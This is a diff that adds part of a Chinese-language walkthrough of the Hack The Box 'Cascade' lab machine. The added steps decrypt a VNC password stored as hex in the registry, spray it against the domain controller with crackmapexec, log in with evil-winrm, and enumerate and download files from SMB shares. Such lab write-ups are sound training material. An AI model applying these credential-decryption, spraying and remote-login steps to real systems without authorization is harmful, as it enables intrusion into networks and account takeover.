@@ -222,8 +222,6 @@ smb: \IT\Email Archives\> ls
 
 内容
 ```
-
-
 From:                                         Steve Smith
 
 To:                                               IT (Internal)
@@ -308,7 +306,112 @@ smb: \IT\Temp\s.smith\> ls
 "VideoRects"=""
 
 ```
-
+留意暴露出了一个密码字段
 ```
 "Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
+```
+
+整理成一个16进制串```6bcf2a4b6e5aca0f```
+
+关于如何破解vnc密码，参考[这个](https://github.com/frizb/PasswordDecrypts)方法
+```
+┌──(root💀kali)-[~/htb/Cascade]
+└─# echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
+00000000  73 54 33 33 33 76 65 32                           |sT333ve2|
+00000008
+
+```
+
+得到了一个明文密码：```sT333ve2```
+
+再次哈希喷洒
+```
+┌──(root💀kali)-[~/htb/Cascade]
+└─# crackmapexec smb 10.10.10.182  -u user.txt -p 'sT333ve2'
+SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\CascGuest:sT333ve2 STATUS_LOGON_FAILURE 
+SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\arksvc:sT333ve2 STATUS_LOGON_FAILURE 
+SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2 
+
+```
+
+得到一组凭据：```s.smith:sT333ve2```
+ 
+
+使用evil-winrm登录，拿到初始shell
+```
+┌──(root💀kali)-[~/htb/Cascade]
+└─# evil-winrm -i 10.10.10.182 -u 's.smith' -p 'sT333ve2'                                                                                                                                                                               1 ⨯
+Evil-WinRM shell v3.2
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\s.smith\Documents> whoami
+cascade\s.smith
+
+```
+
+
+# 继续枚举
+
+```
+┌──(root💀kali)-[~/htb/Cascade]
+└─# smbmap -u "s.smith" -p "sT333ve2" -H 10.10.10.182
+[+] IP: 10.10.10.182:445        Name: 10.10.10.182                                      
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        Audit$                                                  READ ONLY
+        C$                                                      NO ACCESS       Default share
+        Data                                                    READ ONLY
+        IPC$                                                    NO ACCESS       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share 
+        print$                                                  READ ONLY       Printer Drivers
+        SYSVOL                                                  READ ONLY       Logon server share 
+```
+
+现在可以进```Audit$```这个文件夹
+
+```
+──(root💀kali)-[~/htb/Cascade]
+└─# smbclient -U 's.smith' \\\\10.10.10.182\\Audit$ 
+Password for [WORKGROUP\s.smith]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Wed Jan 29 13:01:26 2020
+  ..                                  D        0  Wed Jan 29 13:01:26 2020
+  CascAudit.exe                      An    13312  Tue Jan 28 16:46:51 2020
+  CascCrypto.dll                     An    12288  Wed Jan 29 13:00:20 2020
+  DB                                  D        0  Tue Jan 28 16:40:59 2020
+  RunAudit.bat                        A       45  Tue Jan 28 18:29:47 2020
+  System.Data.SQLite.dll              A   363520  Sun Oct 27 02:38:36 2019
+  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 02:38:38 2019
+  x64                                 D        0  Sun Jan 26 17:25:27 2020
+  x86                                 D        0  Sun Jan 26 17:25:27 2020
+
+                6553343 blocks of size 4096. 1625542 blocks available
+smb: \> 
+
+```
+
+把里面的一个数据库文件和批处理文件下载到本地
+```
+smb: \> cd db
+smb: \db\> ls
+  .                                   D        0  Tue Jan 28 16:40:59 2020
+  ..                                  D        0  Tue Jan 28 16:40:59 2020
+  Audit.db                           An    24576  Tue Jan 28 16:39:24 2020
+
+                6553343 blocks of size 4096. 1625542 blocks available
+smb: \db\> get Audit.db
+getting file \db\Audit.db of size 24576 as Audit.db (8.8 KiloBytes/sec) (average 8.8 KiloBytes/sec)
+smb: \db\> cd ..
+smb: \> get RunAudit.bat
+getting file \RunAudit.bat of size 45 as RunAudit.bat (0.0 KiloBytes/sec) (average 5.4 KiloBytes/sec)
+
+```
+
+批处理RunAudit.bat内容
+```
+CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
 ```
